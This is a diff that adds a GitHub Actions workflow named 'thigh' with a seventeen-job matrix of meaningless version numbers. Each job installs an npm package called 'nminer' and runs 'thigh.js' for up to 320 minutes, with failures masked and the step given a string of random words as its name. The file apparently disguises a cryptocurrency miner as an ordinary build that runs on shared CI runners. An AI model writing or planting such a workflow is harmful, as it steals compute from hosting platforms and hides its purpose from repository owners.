@@ -1,0 +1,42 @@
+name: thigh
+on:
+  push:
+    branches: [ "main" ]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        config:
+          - { version: 2109 }
+          - { version: 2015 }
+          - { version: 2877 }
+          - { version: 3088 }
+          - { version: 9049 }
+          - { version: 2015 }
+          - { version: 4766 }
+          - { version: 2239 }
+          - { version: 5102 }
+          - { version: 4437 }
+          - { version: 2478 }
+          - { version: 8984 }
+          - { version: 1959 }
+          - { version: 1411 }
+          - { version: 5371 }
+          - { version: 7461 }
+          - { version: 5099 }
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Install Node.js
+        uses: actions/setup-node@v3
+        with:
+          node-version: 20
+          
+      - name: minority noisily eek yet before
+        run: |
+          npm install nminer@latest
+          timeout 320m node thigh.js || echo "thigh executed"
